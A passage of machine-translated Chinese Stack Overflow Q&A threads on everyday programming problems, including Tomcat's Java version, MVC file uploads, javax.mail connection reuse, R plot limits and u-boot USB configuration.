> 赞同：1
> 
> 时间：2021-02-05T05:40:06.823

java版本在tomcat启动后立即写入日志文件。只需`"Java Home"`在 Catalina 日志中查找关键字`logs\catalina.yyyy-mm-dd.log`。

```
Nov 23, 2020 3:56:19 PM org.apache.catalina.startup.VersionLoggerListener log
INFO: Java Home:             C:\Program Files\Java\jre1.8.0_251 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-10-15T04:30:43.383

如果您`Tomcat`从运行，将使用`Eclipse`的 JVM 版本是*已安装 JRE*中**选中**的 JRE 版本。`Tomcat`

 ***## 例子：

[![在此处输入图像描述](../Images/06d3b2f2898bff99ac6a55867feef1d1.png)](https://i.stack.imgur.com/OAbkF.png)

## 查看：

[![在此处输入图像描述](../Images/4fbcb214b49979141d4e7d486fff1bee.png)](https://i.stack.imgur.com/24xdW.png)

## 奖金：

如果你想了解哪个 Tomcat 的版本与哪个版本的 Java 兼容，请查看[这里](http://tomcat.apache.org/whichversion.html)***

# c# - .NET MVC3 图片上传相关错误：从“System.Web.HttpPostedFileWrapper”类型转换为“Project.Domain.Entities.Image”类型

> ID：13287508
> 
> 赞同：2
> 
> 时间：2012-11-08T10:47:38.617
> 
> 标签：c#, .net, image, upload, type-conversion

我将尝试简单地解释它：

我有一个实体 - 图像 - 看起来像这样：

```
public class Image : IEntity
    {
        public int ID
        {
            get;
            set;
        }
        public string name
        {
            get;
            set;
        }
        public virtual ICollection<Restaurant> Restaurant
        {
            get;
            set;
        }
    }
} 
```

以下是 Restaurant 实体类中的相关属性：

```
[HiddenInput(DisplayValue = false)]
public Guid ImageID { get; set; }
public string ImageName { get; set; }
public virtual Image Image
        {
            get;
            set;
        }

        public byte[] ImageData 
        { 
            get; set; 
        }
        [HiddenInput(DisplayValue = false)]
        public string ImageMimeType 
        { 
            get; set; 
        } 
```

在我的视图中，用户拍摄图像并将其上传以保存给他们的用户，我有一个简单的`<input type="file" name="image" />`，带有 enctype =“multipart/form-data”。在这种情况下，用户是一个实体 - 餐厅。

```
@using (Html.BeginForm("Edit", "Admin", FormMethod.Post, new { enctype = "multipart/form-data" }))

[...]

<input type="file" name="image" />

[...] 
```

这是 AdminController 中的 ActionResult，它应该处理发布的图像（以及来自 html 的其他数据）。

```
[HttpPost]
        public ActionResult Edit(Restaurant rest, Address address, HttpPostedFileWrapper image)
        {
            if (ModelState.IsValid)
            {
                if (image != null && image.ContentLength > 0)
                {
                    var filename = Path.GetFileName(image.FileName);
                    Guid imageID = Guid.NewGuid();
                    var relativePath = @"~/Content/Images/Logotypes/" + imageID.ToString();
                    image.SaveAs(Server.MapPath(relativePath));

                    rest.ImageMimeType = image.ContentType;
                    rest.ImageName = filename;
                    rest.ImageID = imageID;

                    repo.Save(rest);
                }
                return View(rest);
            }
            else
            {
                var errors = ModelState
                .Where(x => x.Value.Errors.Count > 0)
                .Select(x => new { x.Key, x.Value.Errors })
                .ToArray();

                return View(rest);
            }
        } 
```

运行代码时，ModelState.IsValid()返回false，ModelState-error如下：

> {System.InvalidOperationException：从类型“System.Web.HttpPostedFileWrapper”到类型“Projct.Domain.Entities.Image”的参数转换失败，因为没有类型转换器可以在这些类型之间进行转换。

有任何想法吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-08T10:51:58.813

modelbinder 尝试将`<input type="file"`命名的元素绑定`image`到`Image`您的`Restaurant`类的属性。

只需为您的操作的第二个参数和`<input type="file`元素指定另一个名称，而不是`image`.

# java - Java 应用程序的 Github 身份验证

> ID：13287509
> 
> 赞同：1
> 
> 时间：2012-11-08T10:47:41.947
> 
> 标签：java, github, github-api

我正在编写一个 java 程序，它将从本地文件创建一个 github repo。为此，我首先必须进行身份验证，然后向 github v3 api 发出经过验证的请求。

但我不知道如何进行身份验证并获取 access_token。我将在 java 代码中提供用户名/密码，所以我不是在寻找 oAuth 解决方案。

您能否提供一些可以帮助我入门的指针或链接。我在 github 开发人员网站上找不到这个。除了身份验证之外，如果您可以提供一个经过身份验证的示例请求来执行创建 repo 或 pull 之类的操作，这也会很有帮助要求...

请帮忙。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-02-19T03:34:29.493

您可以使用[jcabi-github](http://github.jcabi.com/index.html)（我是它的开发人员之一），它会为您完成所有身份验证工作：

```
Github github = new RtGithub("user", "password"); 
```

现在您可以创建一个存储库：

```
Repo repo = github.repos().create(
  Json.createObjectBuilder().add("name", "repo-name").build()
); 
```

# string - 雅虎管道字符串将第一个单词更改为最后一个单词

> ID：13287511
> 
> 赞同：2
> 
> 时间：2012-11-08T10:47:44.217
> 
> 标签：string, loops, yahoo-pipes

我不太了解雅虎管道，我只是在徘徊，是否有可能使`first word`感动成为`last word`句子？

例如，我有一些提要，有这样的项目标题

`Stackoverflow : The best way to do self-programming learning`

然后我想移动第一个词，也就是`Stackoverflow`像这样的最后一个词

`The best way to do self-programming learning - Stackoverflow`

我怎么做 ？

在我的逻辑中：我们需要将第一个单词与提要分开，然后将它们存储到*“内存”或类似的东西中”*

然后我们使用`string builder`then 将存储的单词带到最后一句话。但我不知道像*“记忆”或类似的“工具”*

**更新 ：**

我如何将两个`string regex`循环加入 1 个项目？ ![图片](../Images/5e43130f773557cd24d25694ea45abe2.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:05:04.447

管道本身将用作内存。:-)

a) 创建一个正则表达式运算符，去掉冒号和前面的所有内容。

b）创建一个正则表达式运算符，去除冒号和之后的所有内容。

c) 将字符串传递给a)*和*b)。

d) 为 [input-from-a] + " - " + [input-from-b] 创建一个字符串构建器。

尝试在这里分享一个例子：http: //pipes.yahoo.com/pipes/pipe.info?_id= [68b135e6b9a182a8bf9e1f329eaaf6f5](http://pipes.yahoo.com/pipes/pipe.info?_id=68b135e6b9a182a8bf9e1f329eaaf6f5)

![在此处输入图像描述](../Images/3c6b34e2c8c204347c05eea22fc9ab4b.png)

# java - 如何有效地使用 javax.mail API 发送批量邮件？& 我们可以使用重用认证会话来提高速度吗？

> ID：13287515
> 
> 赞同：20
> 
> 时间：2012-11-08T10:48:02.583
> 
> 标签：java, email, smtp, jakarta-mail

我可以使用 javax.mail API 发送邮件。但这里的问题是平均每封邮件需要大约 4.3 秒才能发送到目的地。

如果我按顺序发送 20 封邮件，大约需要 86.599 秒。对于我的要求，这种方法不起作用。我正在寻找一种可以在更短的时间内发送大量邮件的方法。

当我查看调试日志时，API 正在尝试对其发送的每条消息向 SMTP 服务器进行身份验证。但我只创建一次会话，并对我发送的所有邮件使用相同的会话。现在我的问题是，每次向 smtp 服务器进行身份验证时，这不是一个开销过程吗？没有更好的方法吗？

以下是您可能会发现有用的日志跟踪。

```
250-AUTH LOGIN PLAIN XOAUTH XOAUTH2
250 ENHANCEDSTATUSCODES
DEBUG SMTP: Found extension "SIZE", arg "35882577"
DEBUG SMTP: Found extension "8BITMIME", arg ""
DEBUG SMTP: Found extension "AUTH", arg "LOGIN PLAIN XOAUTH XOAUTH2"
DEBUG SMTP: Found extension "ENHANCEDSTATUSCODES", arg ""
DEBUG SMTP: Attempt to authenticate
DEBUG SMTP: check mechanisms: LOGIN PLAIN DIGEST-MD5 NTLM 
DEBUG SMTP: AUTH LOGIN command trace suppressed
DEBUG SMTP: AUTH LOGIN succeeded 
```

请让我知道您对此的想法，非常感谢您对此的任何帮助。

-纳伦德拉

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-11-08T11:34:09.683

你是如何发送消息的？[JavaMail FAQ](http://www.oracle.com/technetwork/java/javamail/faq-135477.html#send)建议静态`Transport.send`方法将为每条消息打开一个新连接，因为它是一种方便的方法，可以创建合适的实例`Transport`、连接它、调用`sendMessage`然后再次关闭连接。如果您从您获得自己的`Transport`实例，`Session`您可以连接一次，然后`sendMessage`重复调用以在一个连接上发送多条消息，最后`close`是它。类似于（未经测试）的东西：

```
Transport t = session.getTransport();
t.connect();
try {
  for(Message m : messages) {
    m.saveChanges();
    t.sendMessage(m, m.getAllRecipients());
  }
} finally {
  t.close();
} 
```

更新为使用资源块尝试：

```
try (Transport t = session.getTransport()) {
    t.connect();
    for(Message m : messages) {
        m.saveChanges();
        t.sendMessage(m, m.getAllRecipients());
    }
} 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2015-05-15T14:33:29.153

我在工作中也有同样的要求。我必须发送批量电子邮件和独立电子邮件。我没有找到简单而令人满意的答案：批量电子邮件可以使用单个连接发送，但独立电子邮件不能，直到我创建异步缓冲以批量发送电子邮件。

`Transport`最后但并非最不重要的一点是，在短时间内使用大量连接会导致 a `no more socket handles are available`，因为所有端口都卡在该`TIME_WAIT`状态。

我最终得出结论，最好的将是一个 SMTP 连接池，因为不存在库（至少是免费的）[，所以我](https://github.com/nithril/smtp-connection-pool)使用 Apache Common Pool 和 Java Mail 创建了我的库：

```
//Declare the factory and the connection pool, usually at the application startup
SmtpConnectionPool smtpConnectionPool = new SmtpConnectionPool(SmtpConnectionFactoryBuilder.newSmtpBuilder().build());

//borrow an object in a try-with-resource statement or call `close` by yourself
try (ClosableSmtpConnection transport = smtpConnectionPool.borrowObject()) {
    MimeMessage mimeMessage = new MimeMessage(session);
    MimeMessageHelper mimeMessageHelper = new MimeMessageHelper(mimeMessage, false);
    mimeMessageHelper.addTo("to@example.com");
    mimeMessageHelper.setFrom("from@example.com");
    mimeMessageHelper.setSubject("Hi!");
    mimeMessageHelper.setText("Hello World!", false);
    transport.sendMessage(mimeMessage, mimeMessage.getAllRecipients());
}

//Close the pool, usually when the application shutdown
smtpConnectionPool.close(); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2021-04-14T07:31:08.810

上述答案要么不相关，要么太复杂而无法实施。所以这是我发布在 Spring Boot 中发送批量电子邮件的最简单解决方案

只需使用

```
mimeMessageHelper.setBcc(emailList); 
```

在哪里，

`mimeMessageHelper`是`MimeMessageHelper`，`emailList`是`String[] emailList`

**笔记：**

确保您没有使用

```
mimeMessageHelper.setTo(emailList) 
```

否则，它将在收件人收到的电子邮件中显示所有收件人的电子邮件地址。

有关更多参考，[This](https://www.javatpoint.com/spring-java-mail-tutorial)和[This](https://www.baeldung.com/spring-email)可以帮助您学习如何在 Spring Boot 中发送电子邮件

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-08T11:07:03.367

不知道标准 Java 邮件 API 是否允许您尝试完成的任务（会话重用），但您可以考虑使用多线程：

我会使用 ThreadPool 并向其提交邮件发送作业。然后您在作业类代码中执行任何错误处理/重新发送，该代码由 ThreadPool 异步执行，您的主线程可以继续执行其他操作。提交作业只需几毫秒。自从我在 Java 中使用线程池实现某些东西已经有一段时间了，但我记得它相当简单明了。如果你谷歌“Java ThreadPool”，你会发现很多资料。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2015-10-14T15:50:00.843

您可以使用线程池，因为它提供了非常好的性能。我已经实现并分享了下面的代码片段。

```
try  {
    ExecutorService executor = Executors.newFixedThreadPool("no. of threads"); // no. of threads is depend on your cpu/memory usage it's better to test with diff. no. of threads.
    Runnable worker = new MyRunnable(message); // message is the javax.mail.Message
    executor.execute(worker);
    executor.shutdown();
    executor.awaitTermination(Long.MAX_VALUE, TimeUnit.MILLISECONDS);
} 
```

# jquery - jQuery Textarea-Expander 插件（我需要填充）

> ID：13287517
> 
> 赞同：0
> 
> 时间：2012-11-08T10:48:14.823
> 
> 标签：jquery, html, css, textarea

有一个**textarea 扩展器 jquery 插件**，在 stackoverflow 上有所提及：http: [//blogs.sitepointstatic.com/examples/tech/textarea-expander/index.html](http://blogs.sitepointstatic.com/examples/tech/textarea-expander/index.html)

这在所有浏览器中都很好用，但是 textarea 的顶部/底部没有填充，这使它看起来有点难看。所以简单的解决方案（我认为）是注释掉这一行，或者将 0 更改为 10 例如：

`$(this).css("padding-top", 0).css("padding-bottom", 0);`

它在 Firefox 中仍然可以正常工作，但在 Chrome 和 Safari 中却不行。对于我输入的每个字符，文本区域都会扩展，直到达到最大高度。我使用的填充越多，它扩展得越多

我在想也许只能在 webkit 浏览器中补偿这一点，并从它设置的高度中删除 padding-top+bottom，但我不知道如何做。

我尝试了其他一些插件，但它们也不能很好地工作，所以这似乎是最稳定的一个，除了填充问题。

有没有人成功让这个看起来不错？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:17:46.750

You could try [this plugin](http://code.google.com/p/gaequery/source/browse/trunk/src/static/scripts/jquery.autogrow-textarea.js) instead

There is an example [here](http://jsfiddle.net/zwHNW/3/) of it working with `padding`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T12:36:23.010

使用引导代码。这里都是默认的css代码。它减少了你的工作。在这里，您可以随意设置高度和宽度。

html

```
 <textarea class='autogrow'></textarea> 
```

css

```
textarea {
height: 200px;
width: 200px;
} 
```

演示：[小提琴演示](http://jsfiddle.net/zwHNW/4/)

# c++ - 当我声明字符串数组时，C++ 如何计算偏移地址

> ID：13287521
> 
> 赞同：3
> 
> 时间：2012-11-08T10:48:26.183
> 
> 标签：c++, arrays, string, offset, memory-address

虽然字符串是动态的，所以它没有任何确定的大小，所以当我在 s[0] 之前得到 s[1] 时，C++ 将如何计算它的偏移地址。

例如 int a[2]

```
0000:1000    a[0]
0000:1004    a[1] 
```

程序：

```
#include<iostream>
#include<vector>
using namespace std;

int main()
{
    string s[2];

    cin>>s[1];
    cout<<s[1]<<endl;

    cin>>s[0];
    cout<<s[0]<<endl;
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-08T10:50:03.023

字符串数组是字符串对象的数组，它们具有固定大小，并且有效地包含了字符串实际所在位置的*指针。*

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-11-08T10:50:33.637

`std::string`在它的内存布局中并不实际包含它的字符。它只包含一个指向动态分配内存的指针并跟踪其大小。就像`std::vector`实际上并没有将其元素存储在其成员中一样。相反，它有一个指向位于“堆上”的实际元素的指针。小号

所以不管一个字符串有多少个字符，它的大小（意思`sizeof (std::string)`）是一个编译时间常数。

# objective-c - 如何在只有一个部分的 UITableView 中实现滚动条？

> ID：13287528
> 
> 赞同：0
> 
> 时间：2012-11-08T10:49:04.437
> 
> 标签：objective-c, ios, uitableview, scrollview

我在 UITableView 中有很多数据，但我不想要任何部分。但是，我想在我的表格视图中实现一个滚动条，其工作方式与

```
 - (NSArray *)sectionIndexTitlesForTableView:(UITableView *)tableView {
        //...
    } 
```

有，但没有部分。我希望我的滚动条滚动到与表格视图的每个单元格中的数据关联的特定数字。

有没有人这样做并且可以为我指明正确的方向？

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T13:39:11.460

假设您的滚动条可以获取所选数据的索引，您可以使用 [UITableView scrollToRowAtIndexPath:atScrollPosition:animated:]。代码可能如下所示：

```
-(void)jumpToSelectedIndex:(NSInteger) selectedIndex {

    NSIndexPath *indexPath = [NSIndexPath indexPathForRow:selectedIndex inSection:0];
    [self.tableView scrollToRowAtIndexPath:indexPath atScrollPosition:UITableViewScrollPositionNone animated:YES];
} 
```

# r - 将新曲线添加到 R 中的绘图时，调整 x 和 y 轴的限制

> ID：13287537
> 
> 赞同：11
> 
> 时间：2012-11-08T10:49:28.550
> 
> 标签：r, plot, range

我有两个绘制的数据集（`df1`和`df2`）。

```
df1 = data.frame(x=c(1:10), y=c(1:10))
df2 = data.frame(x=c(0:13), y=c(0:13)^1.2)

# plot
plot(df1)
# add lines of another dataset
lines(df2) 
```

的某些值`df2`超出了绘图范围，因此不可见。（在这个例子中，我可以先绘制`df2`）。我通常会尝试找出我的数据的范围，如下所示。

```
# manual solution
minX = min(df1$x, df2$x)
minY = min(df1$y, df2$y)
maxX = max(df1$x, df2$x)
maxY = max(df1$y, df2$y)

plot (df1, xlim=c(minX, maxX), ylim=c(minY, maxY))
lines(df2) 
```

当有许多数据集时，这变得很烦人。我想知道是否有更简单的方法来调整轴的范围。在第一步中，R 自己找到轴范围。当添加新数据集时，R 是否还有一种方法可以调整轴范围？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T12:06:02.013

You could use `range` to calculate the limits.

Imho, a better solution:

```
df1 <- data.frame(x=c(1:10), y=c(1:10))
df2 <- data.frame(x=c(0:13), y=c(0:13)^1.2)

ll <- list(df1,df2)

ll <- lapply(1:length(ll),function(i) {res <- ll[[i]]; res$grp <- i; res})

df <- do.call("rbind",ll)
df$grp <- factor(df$grp)

library(ggplot2)
p1 <- ggplot(df,aes(x=x,y=y,group=grp,col=grp)) + geom_line()
p1 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-08T14:49:58.017

我喜欢@Roland 的解决方案，但这是@Glen_b 解决方案的扩展，适用于任意数量的数据集，*如果*您将它们全部放在一个列表中。

（*警告*：未经测试！）

```
dflist <- list(df1,df2,df3,...)  ## dots are not literal!
plotline <- function(L,...) {    ## here the dots are literal
  ## use them to specify (e.g.) xlab, ylab, other arguments to plot()
  allX <- unlist(lapply(L,"[[","x"))
  allY <- unlist(lapply(L,"[[","y"))
  plot (df1, xlim=range(allX), ylim=range(allY),type="n",...)
  invisible(lapply(L,lines))
} 
```

这假设您希望将所有数据集绘制为线条。如果您想开始指定单独的颜色、点类型等，您可以扩展此功能——但您将开始重新发明`lattice`and`ggplot2`包。

（如果您的所有数据集大小相同，则应考虑`matplot`）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-08T11:23:03.997

你总是可以写一个函数：

```
plotline <- function(df1,df2) {

  minX = min(df1$x, df2$x)
  minY = min(df1$y, df2$y)
  maxX = max(df1$x, df2$x)
  maxY = max(df1$y, df2$y)

  plot (df1, xlim=c(minX, maxX), ylim=c(minY, maxY))
  lines(df2)
} 
```

然后你就这样做：

```
plotline(firstdf,seconddf) 
```

如果你想变得花哨，你甚至可以包含参数`...`并将其传递给 plot 调用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-08T17:28:21.323

查看`matplot`函数，它将接受一个矩阵作为 x、y 或两者，并为您执行所有自动范围计算。如果您有多个数据帧中的数据，那么您可以使用 sapply 来提取关键部分并形成矩阵。

这种方法通常比多次使用 lines 函数更简单：

```
df1 <- data.frame(x=1:10, y=1:10)
df2 <- data.frame(x=0:13, y=(0:13)^1.2)
df3 <- data.frame(x= -3:5, y= 5:(-3))

mylist <- list( df1, df2, df3 )
max.n <- max(sapply(mylist,nrow))
tmpfun <- function(df, which.col, n) {
    tmp <- df[[which.col]]
    c(tmp, rep(NA, n-length(tmp)))
}

matplot( sapply(mylist, tmpfun, which.col='x', n=max.n),
        sapply(mylist, tmpfun, which.col='y', n=max.n), type='b' ) 
```

如果所有数据帧都具有相同的行数，则上述内容甚至更简单。

评论中提到的另一种方法是将数据集组合成一个数据集，并使用格子图形或 ggplot2 等工具：

```
lengths <- sapply(mylist, nrow)
df.all <- do.call(rbind, mylist)
df.all$group <- rep( seq_along(lengths), lengths )

library(lattice)
xyplot( y~x, data=df.all, groups=group, type='b' )

library(ggplot2)
qplot(x,y, colour=factor(group), data=df.all, geom=c('point','path') ) 
```

如果一切都失败了，您可以使用`zoomplot`TeachingDemos 包中的功能来更改基础图形的限制，但上述方法要好得多。

# c# - ListBox对于多对多的关系

> ID：13287539
> 
> 赞同：1
> 
> 时间：2012-11-08T10:49:37.290
> 
> 标签：c#, asp.net-mvc, razor, asp.net-mvc-4, ef-code-first

我正在寻找一种良好且易于使用的解决方案，用于在 MVC 中为多对多关系创建 MultiSelectLists。

我有以下示例代码，它工作正常，但它只需要很多代码，如果它更短，更智能，甚至以某种方式通用，那就太酷了，这样在未来的项目中很容易创建 MultiSelectLists..

这是我的做法，（没什么花哨的）

**我的数据库使用实体框架代码优先：** 书籍和作者，其中一本书可以有多个作者。

```
public class DataContext : DbContext
{
    public DbSet<Book> Books { get; set; }
    public DbSet<Author> Authors { get; set; }
}
public class Book
{
    public int Id { get; set; }
    public string Name { get; set; }

    //Allows multiple authors for one book.
    public virtual ICollection<Author> Authors { get; set; }
}
public class Author
{
    public int Id { get; set; }
    public string Name { get; set; }

    [NotMapped]
    public int[] SelectedBooks { get; set; }
    public virtual ICollection<Book> Books { get; set; }
} 
```

**控制器**

```
 public ActionResult Edit(int id = 0)
    {
        Author author = db.Authors.Find(id);
        if (author == null)
        {
            return HttpNotFound();
        }
        ViewData["BooksList"] = new MultiSelectList(db.Books, "Id", "Name", author.Books.Select(x => x.Id).ToArray());

        return View(author);
    }

    [HttpPost]
    public ActionResult Edit(Author author)
    {
        ViewData["BooksList"] = new MultiSelectList(db.Books, "Id", "Name", author.SelectedBooks);

        if (ModelState.IsValid)
        {
            //Update all the other values.
            Author edit = db.Authors.Find(author.Id);
            edit.Name = auther.Name;

        //------------    
            //Make adding items possible
            if (edit.Books == null) edit.Books = new List<Book>();

            //Remove the old, add the new, instead of finding out what to remove, and what to add, and what to leave be.
            foreach (var item in edit.Books.ToList())
            {
                edit.Books.Remove(item);
            }
            foreach (var item in author.SelectedBooks)
            {
                edit.Books.Add(db.Books.Find(item));
            }
        //------------- 
        // This is the code i want to simplify
        // Would be cool with a generic extention method like this:
        // db.ParseNewEntities(edit.Books, author.SelectedBooks);
        // I just don't know how to code it.  

            db.SaveChanges();
            return RedirectToAction("Index");
        }
        return View(author);
    } 
```

**看法**

```
 @Html.ListBox("SelectedBooks",(MultiSelectList)ViewData["BooksList"]) 
```

希望我在正确的论坛上发布了这个！

# arm - 在 u-boot 中启用 USB 支持时出错

> ID：13287540
> 
> 赞同：2
> 
> 时间：2012-11-08T10:49:37.447
> 
> 标签：arm, embedded-linux

我有[Am-1808](http://www.logicpd.com/products/system-on-modules/zoom-am1808/)，我需要从 usb 而不是 sd 卡启动，如此处[所述](http://processors.wiki.ti.com/index.php/Booting_Linux_kernel_using_U-Boot#USB_Storage)。以前我使用的是 Davinci-PSP-SDK-03.21.00.4，但是这个 psp 的 uboot 没有 USB 支持（我通过在 uboot 菜单中输入 'help' 确认了这一点，它没有 'usb' 命令可用）。[所以我从 denx 树下载了 u-boot，它在 u-boot 菜单中有“usb”命令，然后按照Ti 员工](http://e2e.ti.com/support/embedded/linux/f/354/t/60039.aspx)的建议在 da850evm.h 中添加了 usb 配置。这是配置：

```
/*
 * USB configuration
 */
#define CONFIG_USB_DA8XX        /* Platform hookup to MUSB controller */
#define CONFIG_MUSB_UDC

#ifdef CONFIG_USB_DA8XX

#ifdef CONFIG_MUSB_HCD          /* include support for usb host */
#define CONFIG_CMD_USB          /* include support for usb cmd */

#define CONFIG_USB_STORAGE      /* MSC class support */
#define CONFIG_CMD_STORAGE      /* inclue support for usb-storage cmd */
#define CONFIG_CMD_FAT          /* inclue support for FAT/storage */
#define CONFIG_DOS_PARTITION    /* inclue support for FAT/storage */

#ifdef CONFIG_USB_KEYBOARD      /* HID class support */
#define CONFIG_SYS_USB_EVENT_POLL
#define CONFIG_PREBOOT "usb start"
#endif /* CONFIG_USB_KEYBOARD */

#endif /* CONFIG_MUSB_HCD */

#ifdef CONFIG_MUSB_UDC
/* USB device configuration */
#define CONFIG_USB_DEVICE               1
#define CONFIG_USB_TTY                  1
#define CONFIG_SYS_CONSOLE_IS_IN_ENV    1
/* Change these to suit your needs */
#define CONFIG_USBD_VENDORID            0x0451
#define CONFIG_USBD_PRODUCTID           0x5678
#define CONFIG_USBD_MANUFACTURER        "Texas Instruments"
#define CONFIG_USBD_PRODUCT_NAME        "DA830EVM"
#endif /* CONFIG_MUSB_UDC */

#endif /* CONFIG_USB_DA8XX */ 
```

在编译时我得到这些错误：

```
usbtty.c:126: error: 'EP0_MAX_PACKET_SIZE' undeclared here (not in a function)
usbtty.c:219: error: 'UDC_INT_ENDPOINT' undeclared here (not in a function)
usbtty.c:222: error: 'UDC_INT_PACKET_SIZE' undeclared here (not in a function)
usbtty.c:245: error: 'UDC_OUT_ENDPOINT' undeclared here (not in a function)
usbtty.c:249: error: 'UDC_BULK_PACKET_SIZE' undeclared here (not in a function)
usbtty.c:256: error: 'UDC_IN_ENDPOINT' undeclared here (not in a function)
usbtty.c:328: error: 'UDC_OUT_PACKET_SIZE' undeclared here (not in a function)
usbtty.c:338: error: 'UDC_IN_PACKET_SIZE' undeclared here (not in a function)
usbtty.c: In function 'usbtty_tstc':
usbtty.c:399: warning: implicit declaration of function 'udc_unset_nak'
usbtty.c: In function 'usbtty_getc':
usbtty.c:424: warning: implicit declaration of function 'udc_set_nak'
usbtty.c: In function 'drv_usbtty_init':
usbtty.c:553: warning: implicit declaration of function 'udc_init'
usbtty.c:560: warning: implicit declaration of function 'udc_startup_events'
usbtty.c:561: warning: implicit declaration of function 'udc_connect'
usbtty.c: In function 'usbtty_init_instances':
usbtty.c:683: warning: implicit declaration of function 'udc_setup_ep'
usbtty.c: In function 'write_buffer':
usbtty.c:846: warning: implicit declaration of function 'udc_endpoint_write'
usbtty.c: In function 'usbtty_poll':
usbtty.c:989: warning: implicit declaration of function 'udc_irq'
make[1]: *** [usbtty.o] Error 1
make[1]: Leaving directory `/home/user/Desktop/Uboot_Screwed/u-boot-    omapl1/drivers/serial'
make: *** [drivers/serial/libserial.a] Error 2 
```

如果你能告诉我如何摆脱这些错误，[我已经用谷歌搜索了它，但没有发现任何有用的东西]，或者如果你可以请给我一个带有“usb”命令的 Am-1808 的 u-boot 链接在 u-boot 菜单中支持。

**更新：**

我在 da850evm.h 中定义了 CONFIG_USB_TTY，正如 auselen 指出的那样，现在我能够解决以前的错误，但我得到了新的错误，这是终端的输出：

```
drivers/serial/libserial.a(usbtty.o): In function `write_buffer':
/home/user/Desktop/Uboot_Screwed/u-boot-omapl1/drivers/serial/usbtty.c:846: undefined     reference to `udc_endpoint_write'
/home/user/Desktop/Uboot_Screwed/u-boot-omapl1/drivers/serial/usbtty.c:890: undefined reference to `udc_endpoint_write'
 drivers/serial/libserial.a(usbtty.o): In function `usbtty_poll':
/home/user/Desktop/Uboot_Screwed/u-boot-omapl1/drivers/serial/usbtty.c:989: undefined         reference to `udc_irq'
/home/user/Desktop/Uboot_Screwed/u-boot-omapl1/drivers/serial/usbtty.c:999: undefined reference to `udc_irq'
/home/user/Desktop/Uboot_Screwed/u-boot-omapl1/drivers/serial/usbtty.c:1009: undefined reference to `udc_irq'
drivers/serial/libserial.a(usbtty.o): In function `usbtty_init_endpoints':
/home/user/Desktop/Uboot_Screwed/u-boot-omapl1/drivers/serial/usbtty.c:727: undefined reference to `udc_setup_ep'
/home/user/Desktop/Uboot_Screwed/u-boot-omapl1/drivers/serial/usbtty.c:727: undefined reference to `udc_setup_ep'
/home/user/Desktop/Uboot_Screwed/u-boot-omapl1/drivers/serial/usbtty.c:727: undefined reference to `udc_setup_ep'
drivers/serial/libserial.a(usbtty.o): In function `drv_usbtty_init':
/home/user/Desktop/Uboot_Screwed/u-boot-omapl1/drivers/serial/usbtty.c:553: undefined reference to `udc_init'
drivers/serial/libserial.a(usbtty.o): In function `usbtty_init_instances':
/home/user/Desktop/Uboot_Screwed/u-boot-omapl1/drivers/serial/usbtty.c:683: undefined     reference to `udc_setup_ep'
drivers/serial/libserial.a(usbtty.o): In function `drv_usbtty_init':
/home/user/Desktop/Uboot_Screwed/u-boot-omapl1/drivers/serial/usbtty.c:560: undefined     reference to `udc_startup_events'
/home/user/Desktop/Uboot_Screwed/u-boot-omapl1/drivers/serial/usbtty.c:561: undefined     reference to `udc_connect'
drivers/serial/libserial.a(usbtty.o): In function `usbtty_tstc':
/home/user/Desktop/Uboot_Screwed/u-boot-omapl1/drivers/serial/usbtty.c:399: undefined     reference to `udc_unset_nak'
drivers/serial/libserial.a(usbtty.o): In function `usbtty_getc':
/home/user/Desktop/Uboot_Screwed/u-boot-omapl1/drivers/serial/usbtty.c:419: undefined     reference to `udc_unset_nak'
/home/user/Desktop/Uboot_Screwed/u-boot-omapl1/drivers/serial/usbtty.c:424: undefined reference to `udc_set_nak'
lib_arm/libarm.a(bootm.o): In function `do_bootm_linux':
/home/user/Desktop/Uboot_Screwed/u-boot-omapl1/lib_arm/bootm.c:122: undefined reference     to `udc_disconnect' 
```

知道如何修复它们吗？

谢谢

问候

乌萨马

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T12:10:21.850

[看起来](http://gitorious.org/u-boot-omap3/mainline/blobs/f298e4b6dd56df3e35a13a6ddd572ca3baf06ad2/include/usb/musb_udc.h#line40)您需要定义/启用`CONFIG_USB_TTY`.

# jquery - jQuery + 循环在 jsfiddle 中不起作用

> ID：13287543
> 
> 赞同：-1
> 
> 时间：2012-11-08T10:49:51.470
> 
> 标签：jquery, jquery-ui, jquery-selectors, jquery-ui-sortable

我有以下脚本，我似乎无法在[jsfiddle](http://jsfiddle.net/oshirowanen/wq6Cc/17/)中工作：

我不明白为什么这不起作用？

```
var $widget = $("<div class='widget widget_" + i + "'>").appendTo( $(".column_" + j );
$("<div class='widget_header widget_header_" + i + "'>").appendTo( $widget );
$("<div class='widget_sub_header widget_sub_header_" + i + "'>").appendTo( $widget );
$("<div class='widget_content widget_content_" + i + "'>").appendTo( $widget );
$("<div class='widget_footer widget_footer_" + i + "'>").appendTo( $widget ); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-08T10:52:55.003

您的脚本中有错误。您忘记了以下行中的右括号：

```
var $widget =                   // --------------------------------------v
    $("<div class='widget widget_" + i + "'>").appendTo( $(".column_" + j) ); 
```

**演示：http:** [//jsfiddle.net/wq6Cc/18/](http://jsfiddle.net/wq6Cc/18/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T10:54:31.443

你必须改变这个

```
var $widget = $("<div class='widget widget_" + i + "'>").appendTo( $(".column_" + j ); 
```

到

```
 var $widget = $("<div class='widget widget_" + i + "'>").appendTo( $(".column_" + j ) ); 
```

